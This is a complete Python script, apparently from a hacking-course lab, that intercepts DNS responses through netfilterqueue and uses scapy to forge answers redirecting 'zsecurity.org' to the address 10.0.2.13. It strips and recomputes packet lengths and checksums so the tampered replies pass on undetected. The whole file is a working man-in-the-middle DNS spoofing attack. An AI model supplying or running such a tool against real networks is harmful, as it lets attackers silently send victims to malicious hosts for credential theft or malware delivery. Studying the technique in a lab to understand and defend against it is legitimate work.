#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # checking if the packet contains a DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if "zsecurity.org" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.13")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # we will delete the fields that make sure the packet has not been modified
            # then scapy will worry about recalculating based on the values that we modified
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # finally modifying the packet before forwarding it using: packet.accept()
            packet.set_payload(str(scapy_packet))
    packet.accept()


# Creating an instance of a netfilterqueue object and placing it in variable called queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
